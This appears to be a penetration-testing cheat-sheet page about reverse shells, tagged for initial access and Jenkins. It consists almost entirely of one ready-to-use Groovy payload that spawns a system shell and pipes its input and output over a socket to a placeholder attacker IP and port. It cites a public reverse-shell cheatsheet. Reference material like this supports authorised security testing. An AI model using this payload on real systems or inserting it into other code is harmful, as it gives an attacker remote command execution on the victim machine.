---
author(s):
  - Userware
tags:
  - initial-access
  - weaponization
  - webapp-pentesting
  - jenkins
---
# Reverse Shells

## Groovy

```groovy
String host="<attacker_IP>";

int port=<attacker_PORT>;

String cmd="</bin/sh | /bin/bash | cmd.exe | powershell.exe>";

Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

---
## References

- [InternalAllTheThings: Reverse Shell Cheatsheet](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet)